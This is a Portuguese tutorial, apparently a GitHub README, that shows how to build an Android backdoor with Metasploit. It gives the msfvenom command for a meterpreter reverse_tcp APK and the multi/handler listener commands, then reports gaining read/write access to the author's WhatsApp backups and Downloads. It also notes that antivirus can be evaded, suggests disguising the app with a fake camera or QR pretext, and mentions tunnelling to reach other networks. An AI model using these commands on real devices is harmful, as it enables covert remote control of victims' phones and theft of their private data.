#
▬▬▬.◙.▬▬▬
═▂▄▄▓▄▄▂
◢◤ █▀▀████▄▄▄▄◢◤
█▄ █ █▄ ███▀▀▀▀▀▀▀╬
◥█████◤
══╩══╩═
╬═╬
╬═╬ 
╬═╬ 
╬═╬       Tutorial by Jetrom
╬═╬☻/
╬═╬/▌
╬═╬/ \

> ⚠️ Uso de má fé é de suma sua responsabilidade. Tutorial apenas para afins educativos.
#
Farei um backdoor, usando meu PC com meu android. Antes, devo explicar o que é "portas do fundo" (backdoor) é literalmente o uso da analogia que é feita. Poder ter acesso quando disponível e fazer alterações sem ser percebido pelo usuário.

<details><summary>Requisitos</summary><p>➡️ Aproximadamente 1 GB de espaço livre. <p>➡️ Firewall desativado. <p>➡️ Antivírus desativado. <p>➡️ 2 GB de ram ou superior. <details><summary>O que foi usado/testado ?</summary><p>➡️ Linux (Mint - <code>Release: 21.1 Codename: vera</code>)<p>➡️ Firewall do PC desativado. <p>➡️ Firewall do roteador ativado. <p>➡️ DNS do Google usado. <p>➡️ Antivírus (Kaspersky (free)) e Google Play Protect ativado. <p>➡️ VPN (ProtonVPN (free (protocolo OpenVPN-UDP))) ativado. <p>➡️ Metasploit Framework. </p></details></p></details>

>Usado DNS do [Quad9](https://www.quad9.net/) no meu roteador, obteve eficiência. Tanto no IPV4 quanto no IPV6. Se usado firewall durantes os testes com [GUFW](https://snapcraft.io/ufw) ativado, podes funcionar ou ser recusado. Configure seu firewall caso precise deixar ativado, se recusado.

Baixe no seu terminal:
```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
  ```
Fonte: https://www.metasploit.com/download
>⚠️ A instalação possa ser diferente.

Depois execute no mesmo terminal para iniciar o Metasploit:

`msfconsole`

>⚠️ Possa haver uma demora. Dependerá do seu processador e quantidade de RAM livre.

O **Metasploit** perguntará:

`[?] Would you like to init the webservice? (Not Required) [no]:`

A princípio não iremos precisar deste recurso. `no`. Após executar, aguarde alguns minutos.

```                                                 
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
```

Agora. Para iniciar nosso ataque. Precisamos de um payload e um ".apk". Como exemplo, iremos usar o Database do Metasploit.

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=localhost LPORT=4444 R >/home/jetronix/Jetrom.apk
```

<details><code>msfvenom</code><p> Gerar tipo de payload </p><code>-p</code><p> Informo um payload </p><code>android/meterpreter/reverse_tcp</code><p> Do tipo android e estabeça conexão com "revese_tcp" com atacante </p><code>LHOST=</code><p> Informa seu IP, quando se conecta a internet </p><code>LPORT=</code><p> Indica qual a porta será criada e acessado pelo atacante </p><code>R ></code><p>Será salvo o arquivo onde? O formato payload é RAW.</p></details>

> ⚠️ O tipo de ataque é na mesma rede LAN. Existe o `portfwd`, para ataques de longa distância, isto é, redes diferentes. Com isso é criado um túnel. No entanto, não usaremos isto.

```
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST localhost
set LPORT 4444
exploit
```
Dê ENTER se `exploit` estiver digitado e não executado. Com isso a conexão com aplicativo está feito. Enviando o "Jetrom.apk" para meu Android, obtive um aviso durante a instalação do apk:

<div align="center">
    <img src="https://raw.githubusercontent.com/Jetrom17/Metasploit/main/img/alert_malware.jpg?token=GHSAT0AAAAAABZRDV2YEU65ZLSC5D7RRSBAY5O5HFQ" height="450" />
</div>

> ⚠️ Existem formas de burlar o tipo de reconhecimento usado por antivírus, especificamente pelo Play Protect, pois tem uma baixa reputação conforme [AV Test](https://www.av-test.org/en/antivirus/mobile-devices/android/november-2022/google-play-protect-33.0-223608/). Não farei isso, deixarei como padrão. Kaspersky é free, tive que escanear manualmente. Se fosse pago, avisaria como mostra na imagem a cima.

<div align="center">
    <img src="https://raw.githubusercontent.com/Jetrom17/Metasploit/main/img/apps.jpg?token=GHSAT0AAAAAABZRDV2YMZXIOQYVLP4ZCNIGY5O5L4A" height="450" />
</div>

Conforme a imagem a cima. Percebemos que o aplicativo pede cerca de 26 permissões para o Android. Não há ícone definido e nem título definido. Como exemplo, nenhum usuário irá baixar esse aplicativo desta forma. Por isso alguns aplicativos contém um "front end" bonito e pede informações da câmera, alegando que "é nercessário o bom funcionamento do app, para que possa escanear Qr Code". Sendo que o app é uma loja de aplicativos alternativas da Google.
> ⚠️ Os dispositivos Android 10 + contém restrições mais forte do que um Android 4.4.1 (kikat). Uma sessão/opção do android contém "Remover permissões se o app não for usadp"/"Permissões removidas".

<div align="center">
    <img src="https://raw.githubusercontent.com/Jetrom17/Metasploit/main/img/backdoor.jpg?token=GHSAT0AAAAAABZRDV2ZSLXNI27K6EOKVJ3MY5O5VZQ" height="450" />
</div>

A imagem a cima contém informações dos **backups do meu Whatsapp**. Na mesma imagem, indo na direção abaixo, contém informções dos meus **Downloads**. O Metasploit informa que tenho seguintes permissões: (r,w (read, write)). O legal que o arquivo na pasta `data` do Android, não se encontra. Isto porque ele está oculto; acessível somente com usuário root. 
> ⚠️ O aplicativo não é oculto, mas os arquivos que são salvos no `data`, como por exemplo do Whatsapp: `data/.com.whatspp` que está vísivel. O invisível usado como usuário root, é a mesma técnica que o aplicativo DroidFS usa para criptografar; sem precisar o android está "rooteado". 

Após um certo tempo não usável, isto é, com conexão do Metasploit desativada e o aplicativo instalado no meu android 11, mais as permissões estando aceitadas por longo período. O Play Protect desativa o aplicativo, isolando.

<div align="center">
    <img src="https://raw.githubusercontent.com/Jetrom17/Metasploit/main/img/play_protect.jpg?token=GHSAT0AAAAAABZRDV2ZOAFPJ7SWFCGY3N3EY5O6B4A" height="450" />
</div>

#

Com isso, concluímos o ataque realizado e vemos a importância dos antívirus em dispositivos móveis. Equivale para Windows, sendo o mais popular para ataques. Não é descartado para outros sistemas operacionais. Vale ressaltar, que a prática usado é muito por criminosos e poucos por hackers éticos. Este foi um exemplo usando **backdoor** no android;

![](https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/120/microsoft/309/hacker-cat_1f431-200d-1f4bb.png)
